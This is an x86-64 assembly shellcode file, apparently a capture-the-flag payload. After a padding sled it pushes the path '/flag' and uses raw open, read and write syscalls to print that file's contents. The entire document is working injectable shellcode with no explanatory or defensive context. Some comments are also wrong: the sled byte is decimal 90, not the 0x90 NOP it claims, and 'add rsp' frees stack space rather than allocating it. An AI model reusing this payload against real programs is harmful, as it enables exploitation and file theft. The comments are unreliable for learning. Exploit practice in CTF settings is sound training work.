.intel_syntax noprefix



.section .text
    .skip 0x800, 90         # generate 0x800 byte of value 90 (nop)
    mov rax, 0x67616c662f   # encoded string: /flag
    push rax                # saving to stack

    mov rdi, rsp            # address of /flag
    mov rsi, 0
    mov rdx, 0
    mov rax, 2              # open file
    syscall                 

    # reading flag
    mov rdi, rax
    add rsp, 70             # allocating space to stack -> 70 byte
    mov rsi, rsp            # rsi = buffer on stack address
    mov rdx, 70
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 70
    mov rax, 1
    syscall
